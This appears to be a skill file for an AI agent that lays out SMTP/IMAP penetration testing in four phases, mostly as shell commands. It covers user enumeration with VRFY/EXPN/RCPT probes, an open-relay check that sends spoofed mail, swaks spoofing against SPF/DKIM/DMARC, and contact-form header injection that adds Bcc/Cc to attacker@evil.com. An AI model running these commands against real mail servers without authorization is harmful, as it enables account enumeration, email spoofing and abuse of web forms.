---
name: proto-smtp
description: "SMTP/IMAP security testing — SMTP relay, user enumeration via VRFY/RCPT, email spoofing (SPF/DKIM/DMARC bypass), SMTP injection, credential brute force. Triggers: 'smtp', 'imap', 'email security', 'smtp relay', 'email spoofing', 'smtp pentest', 'email enum', 'vrfy', 'smtp injection', 'mail server'."
---

# SMTP / IMAP Security Testing

Test email server security for relay, spoofing, and credential vulnerabilities.

---

## Phase 1: SMTP Enumeration

```bash
TARGET="TARGET_IP"

nmap -p 25,465,587 -sV --script smtp-commands,smtp-open-relay,smtp-enum-users \
  "$TARGET" 2>/dev/null | tee output/smtp_enum.txt

nc "$TARGET" 25 << 'EOF'
EHLO test.com
VRFY root
VRFY admin
VRFY postmaster
EXPN root
QUIT
EOF

for USER in root admin postmaster webmaster info support; do
  RESULT=$(echo -e "EHLO test.com\nMAIL FROM:<test@test.com>\nRCPT TO:<$USER@$TARGET>\nQUIT" | nc "$TARGET" 25 2>/dev/null | grep "250\|550")
  echo "$USER → $RESULT"
done | tee output/smtp_users.txt
```

---

## Phase 2: Open Relay Testing

```bash
TARGET="TARGET_IP"

nmap -p 25 --script smtp-open-relay "$TARGET" 2>/dev/null

nc "$TARGET" 25 << 'EOF'
EHLO test.com
MAIL FROM:<fake@notreal.com>
RCPT TO:<victim@external.com>
DATA
From: fake@notreal.com
To: victim@external.com
Subject: Relay Test

If you receive this, the server is an open relay.
.
QUIT
EOF
```

---

## Phase 3: SPF/DKIM/DMARC Analysis

```bash
TARGET="target.com"

dig "$TARGET" TXT +short | grep "v=spf1"
# "~all" = softfail (spoofable with some bypass)
# "-all" = hardfail (strict)
# "?all" = neutral (no enforcement)

dig "default._domainkey.$TARGET" TXT +short

dig "_dmarc.$TARGET" TXT +short

swaks --to victim@external.com --from attacker@mail.$TARGET \
  --server "$TARGET" 2>/dev/null
```

---

## Phase 4: SMTP Injection

```bash
TARGET="https://TARGET"

curl -s -X POST "$TARGET/contact" \
  -d "name=Test%0ACc: attacker@evil.com&email=test@test.com&message=test"

curl -s -X POST "$TARGET/contact" \
  -d "name=Test&email=test@test.com&subject=Test%0ABcc: attacker@evil.com&message=test"
```

---

## Output

Save to `output/`:
- `smtp_enum.txt` — banner and capability enumeration
- `smtp_users.txt` — enumerated user accounts
- `smtp_relay.txt` — open relay test results

## Next Phase

→ `recon-dorking` for email credential exposure
→ `pentest-report` to document mail server findings
